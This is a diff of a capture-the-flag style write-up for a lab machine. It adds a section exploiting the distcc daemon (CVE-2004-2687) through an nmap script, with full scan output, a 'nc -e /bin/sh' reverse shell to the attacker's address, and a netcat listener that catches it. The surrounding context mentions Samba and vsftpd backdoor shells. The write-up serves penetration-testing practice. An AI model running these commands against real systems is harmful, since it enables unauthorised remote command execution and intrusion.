@@ -482,6 +482,10 @@ Password:
 session setup failed: NT_STATUS_IO_TIMEOUT
 smb: \> 
 
+
+#################################################################################
+
+
 # in prior to the samaba exploit, listen to the incoming reverse shell with netcat on the tcp port 443
 nc -nvlp 443
 listening on [any] 443 ...
@@ -511,6 +515,10 @@ user tyla:)
 331 Please specify the password.
 pass tyla
 
+
+#################################################################################
+
+
 # listen to incoming reverse shell with nc
 nc 10.10.10.3 6200
 ```
@@ -526,6 +534,10 @@ user tyla:)
 331 Please specify the password.
 pass tyla
 
+
+#################################################################################
+
+
 # listen to incoming reverse shell with nc
 nc 10.10.10.3 6200
 id
@@ -536,4 +548,94 @@ root
 
 ### distcc
 
-This time I would like to use nmap script engine to exploit the target. Let's see if we have any script available in nmap then exploit 
+This time I would like to use nmap script engine to exploit the target. Let's see if we have any script available in nmap then exploit it as shown below.
+
+```bash
+# look for nmap scripts for this exploit
+find /usr/share/nmap/scripts/*dist* -type f 2>/dev/null
+/usr/share/nmap/scripts/distcc-cve2004-2687.nse                                  
+
+# observe its content with less command
+less /usr/share/nmap/scripts/distcc-cve2004-2687.nse
+
+# change the script name to reflect the provided command
+mv /usr/share/nmap/scripts/distcc-cve2004-2687.nse /usr/share/nmap/scripts/distcc-exec.nse
+
+# execute the following if it returns the correct value
+nmap -p 3632 10.10.10.3 --script distcc-exec --script-args="distcc-exec.cmd='hostname'"
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-08 05:35 EST
+Nmap scan report for 10.10.10.3
+Host is up (0.26s latency).
+
+PORT     STATE SERVICE
+3632/tcp open  distccd
+| distcc-exec: 
+|   VULNERABLE:
+|   distcc Daemon Command Execution
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2004-2687
+|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
+|       Allows executing of arbitrary commands on systems running distccd 3.1 and
+|       earlier. The vulnerability is the consequence of weak service configuration.
+|       
+|     Disclosure date: 2002-02-01
+|     Extra information:
+|       
+|     lame # <--- RETURN VALUE
+|   
+|     References:
+|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
+|_      https://distcc.github.io/security.html
+
+Nmap done: 1 IP address (1 host up) scanned in 1.83 seconds
+
+# verify the login username with this exploit
+nmap -p 3632 10.10.10.3 --script distcc-exec --script-args="distcc-exec.cmd='id'"
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-08 05:37 EST
+Nmap scan report for 10.10.10.3
+Host is up (0.26s latency).
+
+PORT     STATE SERVICE
+3632/tcp open  distccd
+| distcc-exec: 
+|   VULNERABLE:
+|   distcc Daemon Command Execution
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2004-2687
+|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
+|       Allows executing of arbitrary commands on systems running distccd 3.1 and
+|       earlier. The vulnerability is the consequence of weak service configuration.
+|       
+|     Disclosure date: 2002-02-01
+|     Extra information:
+|       
+|     uid=1(daemon) gid=1(daemon) groups=1(daemon) # <--- RETURN VALUE
+|   
+|     References:
+|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
+|_      https://distcc.github.io/security.html
+
+Nmap done: 1 IP address (1 host up) scanned in 1.78 seconds
+
+# initiate reverse shelling 
+nmap -p 3632 10.10.10.3 --script distcc-exec --script-args="distcc-exec.cmd='nc -e /bin/sh 10.10.16.2 443'"
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-08 05:31 EST
+Nmap scan report for 10.10.10.3
+Host is up (0.26s latency).
+
+PORT     STATE SERVICE
+3632/tcp open  distccd
+
+Nmap done: 1 IP address (1 host up) scanned in 31.08 seconds
+
+#################################################################################
+
+# listen to the inbound
+$ nc -nvlp 443
+# gain the shell access with daemon user account
+connect to [10.10.16.2] from (UNKNOWN) [10.10.10.3] 57777
+id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+```
